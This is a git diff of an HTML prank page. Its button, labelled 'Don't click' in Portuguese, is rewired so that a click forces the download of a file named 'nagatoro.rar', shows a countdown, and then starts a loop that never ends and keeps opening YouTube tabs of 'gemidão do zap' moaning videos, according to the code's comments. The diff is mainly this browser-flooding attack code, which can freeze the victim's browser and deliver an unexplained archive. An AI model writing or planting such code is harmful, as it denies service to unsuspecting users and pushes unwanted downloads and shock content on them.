@@ -27,24 +27,56 @@
             background-color: rgb(255, 100, 100);
             cursor: pointer;
         }
+
+        #msg {
+            font-size: 80px;
+            color: white;
+            text-shadow: 1px 1px 5px black;
+        }
     </style>
 </head>
 
 <body>
-    <button onmouseover="abre()">Não clique</button>
+    <button onclick="nuke()">Não clique</button>
+    <div id="msg"></div>
     <script>
-        function abre() {
-            const audio = new Audio("audio.mp3");
-            audio.play();
+        // função do botão. Todas outras funções serão ativadas depois dessa
+        function nuke() {
+            // baixar arquivo
+            document.location.href = "nagatoro.rar";
 
-            while (true) {
-                open("https://www.youtube.com/watch?v=uuNqaNCUFu8");
-                open("https://www.youtube.com/watch?v=TZEijhxnXm4");
-                open("https://www.youtube.com/watch?v=LVD1D9ZxLOI");
-                open("https://www.youtube.com/watch?v=b13Pbat-P9I");
-                open("https://www.youtube.com/watch?v=wsMIoRkkHBU");
-                open("https://www.youtube.com/watch?v=2x2quAfcKlE");
-                open("https://www.youtube.com/watch?v=JdhbGJ3mWM8");
+            // inicio do contador
+            let conta = 0;
+            let msg = document.getElementById("msg");
+
+            // intervalo de 1 segundo para os números do contador
+            setInterval(mensagem, 1000)
+            function mensagem() {
+                if (conta < 10) {
+                    conta++
+                    msg.innerHTML += conta + ", ";
+                }
+            }
+            // fim do contador
+
+            // intervalo de 10 segundos para a função de abrir páginas. Tempo feito para combinar com o contador
+            setInterval(abre, 10000);
+            // função de abrir páginas
+            function abre() {
+                // tocar áudio. Não funciona porque não dá tempo do site carregar
+                const audio = new Audio("audio.mp3");
+                audio.play();
+
+                while (true) {
+                    // todos vídeos são gemidão do zap
+                    open("https://www.youtube.com/watch?v=uuNqaNCUFu8");
+                    open("https://www.youtube.com/watch?v=TZEijhxnXm4");
+                    open("https://www.youtube.com/watch?v=LVD1D9ZxLOI");
+                    open("https://www.youtube.com/watch?v=b13Pbat-P9I");
+                    open("https://www.youtube.com/watch?v=wsMIoRkkHBU");
+                    open("https://www.youtube.com/watch?v=2x2quAfcKlE");
+                    open("https://www.youtube.com/watch?v=JdhbGJ3mWM8");
+                }
             }
         }
     </script>
